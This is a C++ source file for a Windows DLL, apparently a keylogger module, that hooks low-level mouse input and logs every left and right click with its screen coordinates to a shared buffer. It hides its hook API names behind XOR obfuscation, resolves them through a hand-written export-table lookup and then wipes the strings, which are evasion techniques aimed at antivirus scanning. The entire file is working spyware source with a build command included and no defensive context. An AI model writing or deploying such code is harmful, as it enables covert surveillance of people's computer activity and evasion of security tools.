//cl /EHsc /LD .\keylog_m_lib.cpp /link User32.lib
#include <Windows.h>
#include <mutex>
#include <string>
#include <vector>
#include <sstream>
#define DLL_EXPORT __declspec(dllexport)
#define X_C(c) static_cast<char>((c) ^ 0xFF)

///////////////////////////////////////////////////////////////////////
HMODULE hUser32;
HHOOK m_hook;
std::vector<std::string>* sharedLogVector = nullptr;
std::mutex logMutex;
///////////////////////////////////////////////////////////////////////
LRESULT CALLBACK M_Proc(int nCode, WPARAM wParam, LPARAM lParam);
///////////////////////////////////////////////////////////////////////

typedef HHOOK(WINAPI *Set_WinHuk_Fn)(int, HOOKPROC, HINSTANCE, DWORD);
typedef BOOL(WINAPI *Un_huk_WinHuk_ExFn)(HHOOK);
typedef LRESULT(WINAPI *Call_NxtHuk_ExFn)(HHOOK, int, WPARAM, LPARAM);

Set_WinHuk_Fn My_Set_WinDows_Huk_ExA;
Un_huk_WinHuk_ExFn My_Unhuk_WinDows_Huk_Ex;
Call_NxtHuk_ExFn My_Call_Nxt_Huk_Ex;

///////////////////////////////////////////////////////////////////////

void* FindExportAddress(HMODULE hModule, const char* funcName)
{
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModule;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dosHeader->e_lfanew);

    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModule + ntHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);

    DWORD* nameRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
    WORD* ordRVAs = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
    DWORD* funcRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);
    for (DWORD i = 0; i < exportDir->NumberOfNames; ++i)
    {
        char* funcNameFromExport = (char*)((BYTE*)hModule + nameRVAs[i]);
        if (strcmp(funcNameFromExport, funcName) == 0)
        {
            DWORD funcRVA = funcRVAs[ordRVAs[i]];
            return (void*)((BYTE*)hModule + funcRVA);
        }
    }
    MessageBoxA(NULL, "Failed to find export address" , "Error", MB_OK);
    return nullptr;
}

DLL_EXPORT void Initialize(std::vector<std::string>* logVector)
{

    char obf_Usr_32[] = { X_C('u'), X_C('s'), X_C('e'), X_C('r'), X_C('3'), X_C('2'), X_C('.'), X_C('d'), X_C('l'), X_C('l'), '\0'};
    char obf_Set_Win_Huk_ExA[] = { X_C('S'), X_C('e'), X_C('t'), X_C('W'), X_C('i'), X_C('n'), X_C('d'), X_C('o'), X_C('w'), X_C('s'), X_C('H'), X_C('o'), X_C('o'), X_C('k'), X_C('E'), X_C('x'), X_C('A'), '\0' };
    char obf_Unhuk_Win_Huk_Ex[] = { X_C('U'), X_C('n'), X_C('h'), X_C('o'), X_C('o'), X_C('k'), X_C('W'), X_C('i'), X_C('n'), X_C('d'), X_C('o'), X_C('w'), X_C('s'), X_C('H'), X_C('o'), X_C('o'), X_C('k'), X_C('E'), X_C('x'), '\0' };
    char obf_Cal_NxtHuk_Ex[] = { X_C('C'), X_C('a'), X_C('l'), X_C('l'), X_C('N'), X_C('e'), X_C('x'), X_C('t'), X_C('H'), X_C('o'), X_C('o'), X_C('k'), X_C('E'), X_C('x'), '\0' };

    for (int i = 0; obf_Usr_32[i] != '\0'; i++) obf_Usr_32[i] ^= 0xFF;
    for (int i = 0; obf_Set_Win_Huk_ExA[i] != '\0'; i++) obf_Set_Win_Huk_ExA[i] ^= 0xFF;
    for (int i = 0; obf_Unhuk_Win_Huk_Ex[i] != '\0'; i++) obf_Unhuk_Win_Huk_Ex[i] ^= 0xFF;
    for (int i = 0; obf_Cal_NxtHuk_Ex[i] != '\0'; i++) obf_Cal_NxtHuk_Ex[i] ^= 0xFF;


    hUser32 = (HMODULE)LoadLibraryA(obf_Usr_32);
    My_Set_WinDows_Huk_ExA = (Set_WinHuk_Fn)FindExportAddress(hUser32, obf_Set_Win_Huk_ExA);
    My_Unhuk_WinDows_Huk_Ex = (Un_huk_WinHuk_ExFn)FindExportAddress(hUser32, obf_Unhuk_Win_Huk_Ex);
    My_Call_Nxt_Huk_Ex = (Call_NxtHuk_ExFn)FindExportAddress(hUser32, obf_Cal_NxtHuk_Ex);
    
    SecureZeroMemory(obf_Usr_32, sizeof(obf_Usr_32));
    SecureZeroMemory(obf_Set_Win_Huk_ExA, sizeof(obf_Set_Win_Huk_ExA));
    SecureZeroMemory(obf_Unhuk_Win_Huk_Ex, sizeof(obf_Unhuk_Win_Huk_Ex));
    SecureZeroMemory(obf_Cal_NxtHuk_Ex, sizeof(obf_Cal_NxtHuk_Ex));

    sharedLogVector = logVector;
    m_hook = My_Set_WinDows_Huk_ExA(WH_MOUSE_LL, M_Proc, GetModuleHandle(NULL), 0);
}

DLL_EXPORT void Cleanup()
{
    if (m_hook) 
    {
        My_Unhuk_WinDows_Huk_Ex(m_hook);
        FreeLibrary(hUser32);
        m_hook = nullptr;
    }
}

LRESULT CALLBACK M_Proc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        MSLLHOOKSTRUCT* m_Struct = (MSLLHOOKSTRUCT*)lParam;
        int x = m_Struct->pt.x;
        int y = m_Struct->pt.y;

        switch (wParam)
        {
            case WM_LBUTTONDOWN:
            {
                std::ostringstream oss;
                oss << x << " , " << y;
                std::string entry = "\n[Left click( " + oss.str() + " )]\n";
                {
                    std::lock_guard<std::mutex> lock(logMutex);
                    sharedLogVector->emplace_back(entry);
                }
                break;
            }
            case WM_RBUTTONDOWN:
            {
                std::ostringstream oss;
                oss << x << " , " << y;
                std::string entry = "\n[Right click( " + oss.str() + " )]\n";
                {
                    std::lock_guard<std::mutex> lock(logMutex);
                    sharedLogVector->emplace_back(entry);
                }
                break;
            }
        }
    }
    return My_Call_Nxt_Huk_Ex(m_hook, nCode, wParam, lParam);
}